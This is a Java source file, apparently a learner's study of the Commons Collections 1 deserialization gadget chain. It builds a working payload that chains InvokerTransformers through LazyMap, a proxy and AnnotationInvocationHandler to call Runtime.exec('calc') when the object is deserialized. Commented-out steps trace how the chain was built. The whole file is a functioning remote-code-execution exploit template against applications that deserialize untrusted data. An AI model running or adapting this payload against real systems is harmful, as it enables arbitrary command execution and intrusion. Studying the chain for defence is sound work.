import com.sun.xml.internal.ws.util.HandlerAnnotationInfo;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

/**
 * AnnotationInvocationHandler.readObject()
 * 	memberValue.setValue()
 * 		MapEntry.setValue()
 * 			TransformedMap.checkSetValue()
 * 				ChainedTransformer.transform()
 * 					ConstantTransformer.transform()
 * 					InvokerTransformer.transform()
 * 						Method.invoke()
 * 							Class.getMethod()
 * 					InvokerTransformer.transform()
 * 						Method.invoke()
 * 							Runtime.getRuntime()
 * 					InvokerTransformer.transform()
 * 						Method.invoke()
 * 							Runtime.exec()
 */
public class CC1 {
    public static void main(String[] args) throws Exception {
//        Runtime.getRuntime().exec("wt");

//        Runtime runtime = Runtime.getRuntime();
//        Class<Runtime> c = Runtime.class;
//        Method getRuntime = c.getDeclaredMethod("exec", String.class);
//        getRuntime.setAccessible(true);
//        getRuntime.invoke(runtime,"wt");

//        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"wt"});
//        invokerTransformer.transform(runtime);


//         反射得到的Runtime
//        Class c = Runtime.class;
//        Method getRuntime = c.getDeclaredMethod("getRuntime",null);
//        Runtime r = (Runtime) getRuntime.invoke(null,null);
//        Method exec = c.getDeclaredMethod("exec", String.class);
//        exec.invoke(r,"wt");

//        可序列化的InvokerTransformer改
//        Object getDeclaredMethod = new InvokerTransformer("getDeclaredMethod", new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}).transform(Runtime.class);
//        Object runtime = new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getDeclaredMethod);
//        Object exec = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"wt"}).transform(runtime);

//      链式+Constant
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        });

//      TransformedMap
//        HashMap<Object, Object> map = new HashMap<>();
//        map.put("value","123");
//        Map<Object,Object> decorate = TransformedMap.decorate(map, null, chainedTransformer);
//
//        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
//        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
//        constructor.setAccessible(true);
//        Object o = constructor.newInstance(Target.class, decorate);


//        LazyMap
        HashMap<Object, Object> map = new HashMap<>();
        Map lazy = LazyMap.decorate(map, chainedTransformer);

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler annotationInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazy);

        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, annotationInvocationHandler);

        Object o = constructor.newInstance(Override.class, mapProxy);


        serialize(o);
        unSerialize("ser.bin");

    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unSerialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
